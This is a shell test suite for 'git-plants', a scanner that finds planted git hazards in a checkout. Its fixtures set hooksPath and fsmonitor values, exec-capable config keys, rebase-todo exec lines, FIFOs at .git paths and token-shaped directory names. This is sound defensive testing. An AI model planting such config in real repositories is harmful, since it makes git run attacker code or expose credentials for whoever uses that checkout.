  _gp_g -C "$_gp_d" config core.hooksPath "$_gp_d/hooks-abs"
  _gp_run "$_gp_d"; _gp_has GP14d "points inside this checkout" "an absolute path under the checkout (a prefix of its root) is inside"
  _gp_g -C "$_gp_d" config core.hooksPath "/nonexistent-kit-hooks/../x"
  _gp_run "$_gp_d"; _gp_has GP14f "points inside this checkout" "an absolute value with .. in it counts as inside (it is not resolved)"
  for _gp_hv in /nonexistent-kit//hooks /nonexistent-kit/./hooks /proc/self/hooks; do
    _gp_g -C "$_gp_d" config core.hooksPath "$_gp_hv"
    _gp_run "$_gp_d"; _gp_has GP14g "points inside this checkout" "the value $_gp_hv (a // or /./ segment, or under /proc) counts as inside"
  done
  _gp_g -C "$_gp_d" config --unset core.hooksPath; printf '[core]\n\thooksPath = .husky\n' > "$_gp_d/.git/config.worktree"
  _gp_run "$_gp_d"; _gp_has GP14e "./.git/config.worktree points inside this checkout" "a hooksPath in config.worktree is read too"; rm -f "$_gp_d/.git/config.worktree"
  _gp_g -C "$_gp_d" config core.hooksPath /nonexistent-kit-hooks
  _gp_run "$_gp_d"; _gp_no GP14b "core.hooksPath" "a hooksPath outside the checkout is not reported"
  _gp_repo gp15; _gp_g -C "$_gp_d" config core.fsmonitor /bin/true
  _gp_run "$_gp_d"; _gp_has GP15 "[core.fsmonitor]" "an fsmonitor key in ./.git/config is reported by name"
  _gp_no GP15b "/bin/true" "and its value is never printed"
  _gp_gp15=$_gp_d
  _gp_kill GP15-key-list-cut '/# MUT-GPKEY$/s/core\.fsmonitor|//' "$_gp_gp15" "[core.fsmonitor]"
  # GP16: a clean tree is silent
  _gp_repo gp16; _gp_run "$_gp_d"
  _gp_no GP16 "warn git-plants" "a clean tree raises no warning"
  _gp_has GP16b "ok   git-plants: nothing found" "and says so"
  _gp_gp16=$_gp_d; _gp_gp16rc=$_gp_rc
  _gp_kill GP16-walk-reports-dotgit '/# MUT-GPWALK2$/d' "$_gp_gp16" "nothing found"
  # GP19: a newline in a path forges no line (the name is withheld)
  _gp_repo gp19; _gp_bad="$_gp_d/nl
  warn git-plants: FORGEDLINE"; mkdir -p "$_gp_bad"; printf 'gitdir: x\n' > "$_gp_bad/.git"
  _gp_run "$_gp_d"; _gp_has GP19 "or shaped like a credential); the name is not shown" "a path with a newline is reported without its name"
  _gp_no GP19b "FORGEDLINE" "and forges no line"
  _gp_gp19=$_gp_d
  _gp_kill GP19-each-unsafe-dropped '/# MUT-GPEACH$/s/gp_w "\$3"; //' "$_gp_gp19" "or shaped like a credential); the name is not shown"
  _gp_kill GP19-names-printed-raw '/# MUT-GPFIND$/s/\*\[!\[:print:\]\]\*|\*"##\["\*|\*:\*@\*) echo UNSAFE/*NEVERMATCHES*) echo UNSAFE/' "$_gp_gp19" "FORGEDLINE" appears
  # GP20: a FIFO named .git is reported and never opened (no hang)
  _gp_repo gp20; mkdir -p "$_gp_d/d1"; mkfifo "$_gp_d/d1/.git"
  _gp_tr "$_gp_d" "$_self"; _gp_has GP20 "a special file named .git: it was not opened" "a FIFO named .git is reported"
  if [ "$_gp_hung" -eq 0 ]; then echo "PASS: git-plants [GP20b] it did not hang"; else echo "FAIL: git-plants [GP20b] C1 hung on a FIFO named .git"; fail=1; fi
  _gp_gp20=$_gp_d
  _gp_kill GP20-fifo-opened '/# MUT-GPFIFO$/s/\[ -f "\$1" \]/[ -e "$1" ]/' "$_gp_gp20" "a special file named .git: it was not opened"
  # GP23-GP29: the review's shapes. A worktree entry with no commondir (a self-contained git dir with its own config); a FIFO at ./.git/config; links at modules, worktrees and a todo file;
  # an indented exec line; a bare layout with a variant-case symlinked HEAD; an unprintable name in the bare scan
  _gp_repo gp23; _gp_g -C "$_gp_d" worktree add -q wt -b wt >/dev/null 2>&1; rm -f "$_gp_d/.git/worktrees/wt/commondir"; printf '[core]\n\tfsmonitor = x\n' > "$_gp_d/.git/worktrees/wt/config"
  _gp_run "$_gp_d"; _gp_has GP23 "has no regular one-line commondir (P5)" "a worktree entry with no commondir is reported"
  _gp_has GP23b "worktrees/wt/config sets key(s)" "and its own config is scanned"
  _gp_gp23=$_gp_d
  _gp_kill GP23-nocommondir-ignored '/# MUT-GPCOMMON$/s/if ! gp_one/if gp_one/' "$_gp_gp23" "has no regular one-line commondir"
  _gp_repo gp24; rm -f "$_gp_d/.git/config"; mkfifo "$_gp_d/.git/config"
  _gp_tr "$_gp_d" "$_self" "$_gp_d/.git/config"; _gp_has GP24 "./.git/config is a link or not a regular file: git would open it" "a FIFO at ./.git/config is reported and git never runs"
  if [ "$_gp_hung" -eq 0 ]; then echo "PASS: git-plants [GP24b] it did not hang"; else echo "FAIL: git-plants [GP24b] C1 hung on a FIFO at ./.git/config"; fail=1; fi
  _gp_gp24=$_gp_d
  _gp_kill GP24-guard-dropped '/# MUT-GPGUARD$/d' "$_gp_gp24" "git would open it" lost "$_gp_d/.git/config"
  _gp_repo gp25; mkdir -p "$_gp_d/.git/modules" "$_gp_d/.git/sequencer"; mv "$_gp_d/.git/modules" "$_gp_d/modules-real"; ln -s ../modules-real "$_gp_d/.git/modules"
  mkdir -p "$_gp_d/wts-real"; ln -s ../wts-real "$_gp_d/.git/worktrees"; ln -s /nonexistent-kit-todo "$_gp_d/.git/sequencer/todo"
  _gp_run "$_gp_d"; _gp_has GP25 "./.git/modules is a link or not a directory" "a symlinked modules directory is reported, not skipped"
  _gp_has GP25b "./.git/worktrees is a link or not a directory" "a symlinked worktrees directory is reported"
  _gp_has GP25c "./.git/sequencer/todo is a link or not a regular file (P10)" "a symlinked todo file is reported"
  _gp_no GP25d "ok   git-plants" "and none of them reads as nothing found"
  _gp_repo gp26; mkdir -p "$_gp_d/.git/rebase-merge"; printf '  exec echo KITSECRETLINE\n' > "$_gp_d/.git/rebase-merge/git-rebase-todo"
  _gp_run "$_gp_d"; _gp_has GP26 "git-rebase-todo holds an exec line (P10)" "an indented exec line is reported (git's parser skips leading whitespace)"
  _gp_repo gp27; mkdir -p "$_gp_d/bare2/objects" "$_gp_d/bare2/refs"; ln -s refs/heads/main "$_gp_d/bare2/Head"
  _gp_run "$_gp_d"; _gp_has GP27 "./bare2 is a bare repository layout (P8)" "a variant-case symlinked HEAD makes a bare layout too"
  _gp_repo gp28; _gp_bad="$_gp_d/nl
x"; mkdir -p "$_gp_bad"; printf 'ref: refs/heads/main\n' > "$_gp_bad/HEAD"
  _gp_run "$_gp_d"; _gp_has GP28 "UNVERIFIED: some paths could not be read" "an unprintable name in the bare scan is UNVERIFIED, not silent"
  # GP29: a ./.git that is not a repository (no HEAD, objects or refs) is reported and no git runs (git would discover upward); GP30: core.hooksPath in a module, worktree-entry or nested config is a finding
  rm -rf "$_gp_t/gp29"; mkdir -p "$_gp_t/gp29/.git"; rm -f "$_gp_t/GITRAN"
  _gp_run "$_gp_t/gp29" "$_self" "$_gp_t/stub"; _gp_has GP29 "./.git lacks HEAD, objects or refs" "an incomplete ./.git is reported, not cleared"
  _gp_no GP29b "ok   git-plants" "and never reads as nothing found"
  if [ ! -e "$_gp_t/GITRAN" ]; then echo "PASS: git-plants [GP29c] no git ran in it"; else echo "FAIL: git-plants [GP29c] git ran in an incomplete ./.git"; fail=1; fi
  _gp_kill GP29-repo-check-dropped '/# MUT-GPREPO$/s/-eq 0 \]/-eq 99 ]/' "$_gp_t/gp29" "lacks HEAD, objects or refs"
  _gp_repo gp30; mkdir -p "$_gp_d/.git/modules/m/objects" "$_gp_d/d1/.git"; printf 'ref: refs/heads/main\n' > "$_gp_d/.git/modules/m/HEAD"
  printf '[core]\n\thooksPath = h\n' > "$_gp_d/.git/modules/m/config"; printf '[core]\n\thooksPath = h\n' > "$_gp_d/d1/.git/config"
  _gp_g -C "$_gp_d" worktree add -q wt -b wt >/dev/null 2>&1; printf '[core]\n\thooksPath = h\n' > "$_gp_d/.git/worktrees/wt/config"
  _gp_run "$_gp_d"; _gp_has GP30 "./.git/modules/m/config sets key(s) that run a program or pull in another file: [core.hookspath]" "a hooksPath in a module config is a finding"
  _gp_has GP30b "./d1/.git/config sets key(s) that run a program or pull in another file: [core.hookspath]" "a hooksPath in a nested .git directory config is a finding"
  _gp_has GP30c "worktrees/wt/config sets key(s) that run a program or pull in another file: [core.hookspath]" "a hooksPath in a worktree entry's config is a finding"
  # GP31: a hook file in a deep module git directory is reported, a .sample file is not (the "three or more segments" warn was cut: its config and hooks are still walked)
  _gp_repo gp31; mkdir -p "$_gp_d/.git/modules/c/modules/d/modules/e/hooks" "$_gp_d/.git/modules/c/modules/d/modules/e/objects"
  printf 'ref: refs/heads/main\n' > "$_gp_d/.git/modules/c/modules/d/modules/e/HEAD"; printf '[core]\n\tbare = false\n' > "$_gp_d/.git/modules/c/modules/d/modules/e/config"
  printf '#!/bin/sh\n' > "$_gp_d/.git/modules/c/modules/d/modules/e/hooks/post-checkout"; printf '#!/bin/sh\n' > "$_gp_d/.git/modules/c/modules/d/modules/e/hooks/pre-commit.sample"
  _gp_run "$_gp_d"
  _gp_has GP31c "post-checkout is a hook file in a submodule git directory (P7)" "a hook file in a module git directory is reported"
  _gp_no GP31d "pre-commit.sample is a hook file" "and a .sample file is not"
  # GP32: git is given an explicit --git-dir=./.git, so it never discovers: a ./.git that git rejects (garbage HEAD) inside a parent repository fails the index read and reads UNVERIFIED instead of listing the parent's gitlinks
  _gp_repo gp32; mkdir -p "$_gp_d/child/.git/objects" "$_gp_d/child/.git/refs"; printf 'garbage\n' > "$_gp_d/child/.git/HEAD"
  _gp_run "$_gp_d/child"; _gp_has GP32 "UNVERIFIED: git did not read the index" "a rejected ./.git inside a parent repository reads UNVERIFIED, not the parent's index"
  _gp_kill GP32-gitdir-dropped '/# MUT-GPGITDIR$/s# git --git-dir=\./\.git # git #' "$_gp_d/child" "UNVERIFIED: git did not read the index"
  # GP33: module git directories are enumerated by HEAD, not by config: one with no config and a hook file, one with a symlinked config
  _gp_repo gp33; mkdir -p "$_gp_d/.git/modules/h/objects" "$_gp_d/.git/modules/h/hooks" "$_gp_d/.git/modules/l/objects"
  printf 'ref: refs/heads/main\n' > "$_gp_d/.git/modules/h/HEAD"; printf '#!/bin/sh\n' > "$_gp_d/.git/modules/h/hooks/pre-push"
  printf 'ref: refs/heads/main\n' > "$_gp_d/.git/modules/l/HEAD"; ln -s /nonexistent-kit-config "$_gp_d/.git/modules/l/config"
  _gp_run "$_gp_d"; _gp_has GP33 "pre-push is a hook file in a submodule git directory (P7)" "a module with no config file still has its hooks checked"
  _gp_has GP33b "./.git/modules/l/config is a link or not a regular file" "a symlinked module config is reported"
  # GP34: a colon in a parent directory's name no longer matters (no ceiling is needed: git is given an explicit --git-dir)
  _gp_repo "co:lon/r"; _gp_run "$_gp_d"
  _gp_has GP34 "ok   git-plants: nothing found" "a colon in the parent path reads like any other tree"
  _gp_has GP34b "known keys only" "and the ok line says it rests on the keys it knows"
  # GP35-GP37 (H1, H2): a NUL in a gitfile (the shell drops it, git stops at it); the root itself as a bare layout; a nested layout made of HEAD and commondir
  _gp_repo gp35; _gp_g -C "$_gp_d" worktree add -q wt -b wt >/dev/null 2>&1; printf 'gitdir: %s/.git/worktrees/wt\000\n' "$_gp_d" > "$_gp_d/wt/.git"
  _gp_run "$_gp_d"; _gp_has GP35 "./wt/.git: unregistered .git file" "a registered worktree's gitfile that holds a NUL is refused, not read as the plain line the shell sees"
  _gp_gp35=$_gp_d
  _gp_kill GP35-nul-allowed '/# MUT-GPNUL$/d' "$_gp_gp35" "unregistered .git file"
  # GP50: git applies `..` physically. A gitfile naming <root>/sym/../.git/worktrees/wt, where sym links elsewhere, leads git to the directory beside sym's target, not to the worktree entry: it is an unregistered .git file, never the exempted worktree line
  _gp_repo gp50; _gp_g -C "$_gp_d" worktree add -q wt -b wt >/dev/null 2>&1; mkdir -p "$_gp_t/gp50-away/real"; ln -s "$_gp_t/gp50-away/real" "$_gp_d/sym"
  printf 'gitdir: %s/sym/../.git/worktrees/wt\n' "$_gp_d" > "$_gp_d/wt/.git"
  _gp_run "$_gp_d"; _gp_has GP50 "./wt/.git: unregistered .git file" "a gitfile whose .. passes through a symlink is judged by where git goes (physical), so it is unregistered"
  _gp_no GP50b "names ./.git/worktrees/<one name>" "and is not the worktree-shaped line doctor exempts"
  _gp_gp50=$_gp_d
  _gp_kill GP50-logical-dotdot '/gp_xp=\$(CDPATH/s/ cd -P / cd /' "$_gp_gp50" "unregistered .git file"
  _gp_repo gp35b; _gp_g -C "$_gp_d" -c protocol.file.allow=always submodule add -q "$_gp_src" sub >/dev/null 2>&1; _gp_g -C "$_gp_d" commit -q -m sub >/dev/null 2>&1; printf 'gitdir: ../.git/modules/sub\000\n' > "$_gp_d/sub/.git"
  _gp_run "$_gp_d"; _gp_has GP35b "registered submodule's gitfile is not one plain line" "a registered submodule's gitfile that holds a NUL is refused"
  _gp_repo gp36; printf 'garbage\n' > "$_gp_d/.git/HEAD"; printf 'ref: refs/heads/main\n' > "$_gp_d/HEAD"; printf '.git\n' > "$_gp_d/commondir"; printf 'dirty\n' > "$_gp_d/index"
  _gp_run "$_gp_d"; _gp_has GP36 ". is a bare repository layout (P8)" "the root as a bare layout (HEAD, commondir, a dirty index) is reported"
  _gp_no GP36b "ok   git-plants" "and never reads as nothing found"
  _gp_has GP36c "UNVERIFIED: git did not read the index" "and a garbage ./.git/HEAD reads UNVERIFIED (no discovery of the bare root)"
  _gp_gp36=$_gp_d
  _gp_kill GP36-commondir-layout-dropped '/# MUT-GPLAYOUT$/s/ || \[ -e .*$/   # MUT-GPLAYOUT/' "$_gp_gp36" ". is a bare repository layout"
  _gp_repo gp37; mkdir -p "$_gp_d/nb"; printf 'ref: refs/heads/main\n' > "$_gp_d/nb/HEAD"; printf '../x\n' > "$_gp_d/nb/commondir"
  _gp_run "$_gp_d"; _gp_has GP37 "./nb is a bare repository layout (P8)" "a nested HEAD plus commondir (no objects or refs) is a layout too"
  # GP38: an exec key in ./.git/config stops the index read. A logging git on the PATH proves no ls-files ran after the finding (the config reads before it are the only calls)
  _gp_real=$(command -v git); mkdir -p "$_gp_t/lg"; printf '#!/bin/sh\nprintf "%%s\\n" "$*" >> "%s/GITLOG"\nexec "%s" "$@"\n' "$_gp_t" "$_gp_real" > "$_gp_t/lg/git"; chmod 755 "$_gp_t/lg/git"
  _gp_repo gp38; _gp_g -C "$_gp_d" config core.fsmonitor /bin/true; rm -f "$_gp_t/GITLOG"
  _gp_run "$_gp_d" "$_self" "$_gp_t/lg"; _gp_has GP38 "[core.fsmonitor]" "an exec key in ./.git/config is reported"
  if [ -s "$_gp_t/GITLOG" ] && ! grep -q 'ls-files' "$_gp_t/GITLOG"; then echo "PASS: git-plants [GP38b] git ran (the config read) but no ls-files after the finding"; else echo "FAIL: git-plants [GP38b] the index was read after an exec-key finding, or no git ran at all"; fail=1; fi
  _gp_gp38=$_gp_d
  _gk=$(mktemp -d); sed '/# MUT-GPCFGSTOP$/s/gp_nogit=1/:/' "$_self" > "$_gk/preflight.sh"
  if cmp -s "$_self" "$_gk/preflight.sh"; then echo "FAIL: mutant GP38-nogit-not-set did not apply"; fail=1
  else
    rm -f "$_gp_t/GITLOG"; _gp_run "$_gp_gp38" "$_gk/preflight.sh" "$_gp_t/lg"
    if grep -q 'ls-files' "$_gp_t/GITLOG" 2>/dev/null; then echo "PASS: mutant GP38-nogit-not-set is killed (ls-files ran after the finding)"; else echo "FAIL: mutant GP38-nogit-not-set survived"; fail=1; fi
  fi
  rm -rf "$_gk"
  _gp_repo gp38b; printf '[include]\n\tpath = x\n' >> "$_gp_d/.git/config"
  _gp_run "$_gp_d"; _gp_has GP38c "[include.path]" "an include.path in ./.git/config is reported (ls-files would follow it)"
  for _gp_kv in 'hook.x.command|true' 'protocol.allow|always' 'extensions.partialclone|origin' 'submodule.x.update|!true' 'url.x.insteadof|y' 'trailer.x.cmd|true'; do
    _gp_repo gp39; _gp_g -C "$_gp_d" config "${_gp_kv%%|*}" "${_gp_kv#*|}"
    _gp_mk=${_gp_kv%%|*}; case "${_gp_mk#*.}" in *.*) _gp_mk="${_gp_mk%%.*}.*.${_gp_mk##*.}" ;; esac   # the report withholds a subsection (SWAS-662): hook.x.command prints as hook.*.command
    _gp_run "$_gp_d"; _gp_has GP39 "[$_gp_mk]" "the exec key ${_gp_kv%%|*} is reported by name, its subsection withheld"
  done
  # GP51 (SWAS-662): a key NAME can hold a credential (url.https://user:token@host/.insteadof, credential.https://u:tok@h.helper): the report prints the section and the variable, the subsection withheld,
  # and a value (an http extraheader) is never read. The marker is built here and lower case (names print lower-cased).
  _gp_lk="kitleak""p$$"
  _gp_repo gp51; _gp_g -C "$_gp_d" config 'includeif.gitdir:/x/.git/worktrees/*.path' /nonexistent
  _gp_g -C "$_gp_d" config "url.https://x:${_gp_lk}@h/.insteadof" y; _gp_g -C "$_gp_d" config "credential.https://u:${_gp_lk}@h.helper" y
  _gp_g -C "$_gp_d" config 'http.https://github.com/.extraheader' "AUTHORIZATION: basic ${_gp_lk}v"
  _gp_run "$_gp_d"; _gp_has GP51 "[includeif.*.path] [url.*.insteadof] [credential.*.helper]" "the three keys print as section.*.variable"
  _gp_no GP51b "$_gp_lk" "and the marker (in two key names and in a header value) appears nowhere, on stdout or stderr"
  _gp_gp51=$_gp_d
  _gp_kill GP51-key-printed-whole '/# MUT-GPMASK$/s/\*\.\*) gp_k=/*.*) gp_kx=/' "$_gp_gp51" "[url.*.insteadof]"
  # GP52: a found name that holds a credential shape (a colon, then an @: user:token@host, or the https://token@host form through the scheme's colon) is withheld like an unprintable one; a bare @ (a pnpm tree) is not
  _gp_repo gp52; mkdir -p "$_gp_d/u:${_gp_lk}@h"; printf 'gitdir: x\n' > "$_gp_d/u:${_gp_lk}@h/.git"
  _gp_run "$_gp_d"; _gp_has GP52 "or shaped like a credential); the name is not shown" "a directory name with an @ is withheld"
  _gp_no GP52b "$_gp_lk" "and the name is printed nowhere"
  _gp_repo gp52m; mkdir -p "$_gp_d/u:${_gp_lk}@h"; printf 'gitdir: x\n' > "$_gp_d/u:${_gp_lk}@h/.git"
  _gp_kill GP52-at-name-printed '/# MUT-GPFIND$/s/|\*:\*@\*//' "$_gp_d" "or shaped like a credential); the name is not shown"
  # GP53: a pnpm tree (a bare @ in node_modules/.pnpm/@scope+x@1.0.0/) raises nothing: no warn from the name, no unverified
  _gp_repo gp53; mkdir -p "$_gp_d/node_modules/.pnpm/@s+x@1.0.0/node_modules/x"; ln -s x "$_gp_d/node_modules/.pnpm/@s+x@1.0.0/node_modules/y"
  _gp_run "$_gp_d"; _gp_no GP53 "warn git-plants" "a pnpm-shaped symlink under node_modules/.pnpm/@s+x@1.0.0/ raises no warning"
  _gp_no GP53b "unverified git-plants" "and no unverified line"
  _gp_has GP53c "ok   git-plants: nothing found" "and the run reads clean"
  _gp_gp53=$_gp_d
  _gp_kill GP53-bare-at-withheld '/# MUT-GPFIND$/s/\*:\*@\*/*@*/' "$_gp_gp53" "or shaped like a credential); the name is not shown" appears
  # GP54: the https://TOKEN@github.com/ form (caught through the scheme's colon) is withheld, the marker nowhere
  _gp_repo gp54; mkdir -p "$_gp_d/https:/${_gp_lk}@github.com"; printf 'gitdir: x\n' > "$_gp_d/https:/${_gp_lk}@github.com/.git"
  _gp_run "$_gp_d"; _gp_has GP54 "or shaped like a credential); the name is not shown" "a https:/TOKEN@github.com/ directory holding a .git is withheld"
  _gp_no GP54b "$_gp_lk" "and the marker is printed nowhere, on stdout or stderr"
  _gp_gp54=$_gp_d
  _gp_kill GP54-token-name-printed '/# MUT-GPFIND$/s/|\*:\*@\*//' "$_gp_gp54" "or shaped like a credential); the name is not shown"
  _gp_repo gp39b; _gp_g -C "$_gp_d" config remote.origin.url https://example.invalid/r.git
  _gp_run "$_gp_d"; _gp_no GP39b "warn git-plants" "an ordinary remote url (every clone has one) is not a finding"
  # GP40: a link to a directory outside the checkout that holds a .git hides a plant from the walk; a link to an empty directory raises nothing
  _gp_repo gp40; mkdir -p "$_gp_t/gp40out" "$_gp_t/gp40empty"; printf 'gitdir: x\n' > "$_gp_t/gp40out/.git"; ln -s "$_gp_t/gp40out" "$_gp_d/lnk"; ln -s "$_gp_t/gp40empty" "$_gp_d/okl"
  _gp_run "$_gp_d"; _gp_has GP40 "./lnk is a link to a directory that holds a .git or a git directory layout" "a link to a directory holding a .git is reported"
  _gp_no GP40b "./okl" "and a link to an empty directory is not"
  _gp_gp40=$_gp_d
  _gp_kill GP40-link-ignored '/# MUT-GPLINK$/s/.*/  return 0/' "$_gp_gp40" "is a link to a directory that holds a .git"
  # GP41 (L3): a name with a bidi mark, or with the text ## [ , is withheld
  _gp_repo gp41; _gp_bidi=$(printf 'd\342\200\256x'); mkdir -p "$_gp_d/$_gp_bidi" "$_gp_d/a##[x"; printf 'gitdir: x\n' > "$_gp_d/$_gp_bidi/.git"; printf 'gitdir: x\n' > "$_gp_d/a##[x/.git"
  _gp_run "$_gp_d"; _gp_has GP41 "or shaped like a credential); the name is not shown" "a name with a bidi mark or with ##[ is withheld"
  _gp_no GP41b "a##[x" "and the ##[ text is never printed"
  _gp_no GP41c "$_gp_bidi" "nor the bidi name"
  _gp_repo gp41m; mkdir -p "$_gp_d/a##[x"; printf 'gitdir: x\n' > "$_gp_d/a##[x/.git"
  _gp_kill GP41-hashbracket-printed '/# MUT-GPFIND$/s/|\*"##\["\*//' "$_gp_d" "or shaped like a credential); the name is not shown"
  # GP42 (L4): a pending exec line under a worktree entry or a submodule git directory; a grep that fails reads UNVERIFIED, never clean (L5: a hooksPath under a temp directory is a warning)
  _gp_repo gp42; _gp_g -C "$_gp_d" worktree add -q wt -b wt >/dev/null 2>&1; mkdir -p "$_gp_d/.git/worktrees/wt/rebase-merge" "$_gp_d/.git/modules/m/rebase-merge"
  printf 'exec echo X\n' > "$_gp_d/.git/worktrees/wt/rebase-merge/git-rebase-todo"; printf 'exec echo X\n' > "$_gp_d/.git/modules/m/rebase-merge/git-rebase-todo"
  _gp_run "$_gp_d"; _gp_has GP42 "./.git/worktrees/wt/rebase-merge/git-rebase-todo holds an exec line (P10)" "a worktree entry's pending exec line is reported"
  _gp_has GP42b "./.git/modules/m/rebase-merge/git-rebase-todo holds an exec line (P10)" "and so is a submodule git directory's"
  mkdir -p "$_gp_t/gstub"; printf '#!/bin/sh\nexit 2\n' > "$_gp_t/gstub/grep"; chmod 755 "$_gp_t/gstub/grep"
  _gp_run "$_gp_d" "$_self" "$_gp_t/gstub"; _gp_has GP42c "UNVERIFIED: some paths could not be read" "a grep that fails reads UNVERIFIED, not clean"
  _gk=$(mktemp -d); sed '/# MUT-GPTODO$/s/gp_unv=1; //' "$_self" > "$_gk/preflight.sh"
  if cmp -s "$_self" "$_gk/preflight.sh"; then echo "FAIL: mutant GP42-grep-failure-clean did not apply"; fail=1
  else
    _gp_run "$_gp_d" "$_gk/preflight.sh" "$_gp_t/gstub"
    case "$_gp_o" in *"UNVERIFIED: some paths could not be read"*) echo "FAIL: mutant GP42-grep-failure-clean survived"; fail=1 ;; *) echo "PASS: mutant GP42-grep-failure-clean is killed" ;; esac
  fi
  rm -rf "$_gk"
  _gp_repo gp42t; _gp_g -C "$_gp_d" config core.hooksPath /tmp/kit-gp-hooks
  _gp_run "$_gp_d"; _gp_has GP42d "warn git-plants: core.hooksPath in ./.git/config points under a temp directory" "a hooksPath under a temp directory is a warning with the hooksPath prefix (doctor's anchored exemption lets its dirty check run)"
  _gp_no GP42e "info git-plants: core.hooksPath" "and no longer an info line"
  _gp_g -C "$_gp_d" config core.hooksPath /dev/shm/kit-gp-hooks
  _gp_run "$_gp_d"; _gp_has GP42f "points under a temp directory" "a hooksPath under /dev/shm is one too"
  _gp_g -C "$_gp_d" config core.hooksPath /tmp
  _gp_run "$_gp_d"; _gp_has GP42g "points under a temp directory" "and a temp root itself (/tmp, not only /tmp/x) is one"
  # GP43: a recursive submodule's gitfile (its parent's index is not read) is an info line that names the limit, with its own unverified line (never ok; doctor does not exempt it)
  _gp_repo gp43; mkdir -p "$_gp_d/.git/modules/a/modules/b/objects" "$_gp_d/d1/inner"; printf 'ref: refs/heads/main\n' > "$_gp_d/.git/modules/a/modules/b/HEAD"; printf 'gitdir: %s/.git/modules/a/modules/b\n' "$_gp_d" > "$_gp_d/d1/inner/.git"
  _gp_run "$_gp_d"; _gp_has GP43 "names a recursive submodule's git directory under ./.git/modules" "a recursive submodule's gitfile is an info line that names the limit"
  _gp_no GP43b "warn git-plants" "and raises no warning"
  _gp_has GP43c "unverified git-plants: a nested .git file names a recursive submodule" "and prints its own unverified line"
  _gp_no GP43d "ok   git-plants" "and never reads as nothing found"
  _gp_no GP43e "names a worktree entry" "and is not the worktree-shaped line doctor exempts"
  _gp_gp43=$_gp_d
  _gp_kill GP43-recursive-unrecognised '/# MUT-GPRECUR$/s#modules/?\*/modules/?\*#modules/NOMATCH#' "$_gp_gp43" "names a recursive submodule's git directory"
  # GP45 (a real submodule linked worktree's entry has the plain commondir ../.. and is not a finding)
  _gp_repo gp45; _gp_g -C "$_gp_d" -c protocol.file.allow=always submodule add -q "$_gp_src" sub >/dev/null 2>&1; _gp_g -C "$_gp_d" commit -q -m sub >/dev/null 2>&1; _gp_g -C "$_gp_d/sub" worktree add -q ../swt -b swt >/dev/null 2>&1
  _gp_run "$_gp_d"; _gp_no GP45b "is not the plain ../.." "a submodule linked worktree entry's commondir (../..) is not a finding"
  # GP46: an include.path naming a FIFO in ./.git/config is reported by key name and never followed (the config is read from / with no repository context; the watchdog releases a hang)
  _gp_repo gp46; mkfifo "$_gp_d/fifo"; printf '[include]\n\tpath = %s/fifo\n[core]\n\tfsmonitor = x\n' "$_gp_d" >> "$_gp_d/.git/config"
  _gp_tr "$_gp_d" "$_self" "$_gp_d/fifo"; _gp_has GP46 "[core.fsmonitor]" "a ./.git/config with an include.path naming a FIFO is read without following the include"
  _gp_has GP46b "[include.path]" "and the include key is reported by name"
  if [ "$_gp_hung" -eq 0 ]; then echo "PASS: git-plants [GP46c] it did not hang"; else echo "FAIL: git-plants [GP46c] C1 hung on an include.path naming a FIFO"; fail=1; fi
  _gp_gp46=$_gp_d
  _gp_kill GP46-config-read-in-repo '/# MUT-GPCFGCD$/s#cd / [&][&]#cd "$gp_root" \&\&#' "$_gp_gp46" "[core.fsmonitor]" lost "$_gp_gp46/fifo"
  # GP46d: a config that git cannot parse (an include to a FIFO, then a garbage line) is read as failed: no index read follows, so nothing opens the include and nothing hangs
  _gp_repo gp46d; mkfifo "$_gp_d/fifo"; printf '[include]\n\tpath = %s/fifo\ngarbage line\n' "$_gp_d" >> "$_gp_d/.git/config"
  _gp_tr "$_gp_d" "$_self" "$_gp_d/fifo"; _gp_has GP46d "unverified git-plants: no git was run" "a config git cannot parse leaves no index read, and says unverified"
  if [ "$_gp_hung" -eq 0 ]; then echo "PASS: git-plants [GP46e] it did not hang"; else echo "FAIL: git-plants [GP46e] C1 hung (the index read opened the include)"; fail=1; fi
  _gp_gp46d=$_gp_d
  _gp_kill GP46-failed-read-keeps-index '/MUT-GPCFGFAIL$/s/; \[ -n "\${3:-}" \] || gp_nogit=1//' "$_gp_gp46d" "unverified git-plants: no git was run" lost "$_gp_gp46d/fifo"
  # GP47: an unverified line prints beside a warning (a hooksPath warn does not hide a nogit one)
  _gp_repo gp47; _gp_g -C "$_gp_d" config core.hooksPath .husky; printf 'garbage line\n' > "$_gp_d/.git/config.worktree"
  _gp_run "$_gp_d"; _gp_has GP47 "points inside this checkout" "a hooksPath warning is printed"
  _gp_has GP47b "unverified git-plants: no git was run" "and the unverified line prints beside it"
  _gp_gp47=$_gp_d
  _gp_kill GP47-unverified-needs-no-warn '/MUT-GPUNV$/s/\[ "\$gp_nogit" -eq 0 \] || printf/[ "$gp_nogit" -eq 0 ] || [ "$gp_warn" -ne 0 ] || printf/' "$_gp_gp47" "unverified git-plants: no git was run"
  # GP48: a worktree entry whose HEAD is a FIFO is a warning and nothing opens it
  _gp_repo gp48; _gp_g -C "$_gp_d" worktree add -q wt -b wt >/dev/null 2>&1; rm -f "$_gp_d/.git/worktrees/wt/HEAD"; mkfifo "$_gp_d/.git/worktrees/wt/HEAD"
  _gp_tr "$_gp_d" "$_self" "$_gp_d/.git/worktrees/wt/HEAD"; _gp_has GP48 "wt/HEAD is not a regular file or a symlink" "a worktree entry with a FIFO HEAD is reported"
  if [ "$_gp_hung" -eq 0 ]; then echo "PASS: git-plants [GP48b] it did not hang"; else echo "FAIL: git-plants [GP48b] C1 hung on a FIFO HEAD"; fail=1; fi
  _gp_gp48=$_gp_d
  _gp_kill GP48-head-check-dropped '/# MUT-GPWTHEAD$/s#gp_w "\$gp_wn/HEAD#: "$gp_wn/HEAD#' "$_gp_gp48" "wt/HEAD is not a regular file" lost "$_gp_gp48/.git/worktrees/wt/HEAD"
  # GP49: a gitlink whose index name is quoted (a quote in the name) is not classified, and says so
  _gp_repo gp49; _gp_sha=$(_gp_g -C "$_gp_d" rev-parse HEAD); _gp_g -C "$_gp_d" update-index --add --cacheinfo "160000,$_gp_sha,q\"x" >/dev/null 2>&1
  _gp_run "$_gp_d"; _gp_has GP49 "a submodule with an unusual name is not classified" "a gitlink with a quoted name is a warning, not skipped"
  _gp_gp49=$_gp_d
  _gp_kill GP49-quoted-name-skipped 's/gp_w "a submodule with an unusual name/: "a submodule with an unusual name/' "$_gp_gp49" "a submodule with an unusual name is not classified"
  # GP21: the exit does not move with findings
  if [ "$_gp_gp1rc" -eq 0 ] && [ "$_gp_gp16rc" -eq 0 ]; then echo "PASS: git-plants [GP21] the exit is 0 with findings and without"; else echo "FAIL: git-plants [GP21] exits differ (findings $_gp_gp1rc, clean $_gp_gp16rc)"; fail=1; fi
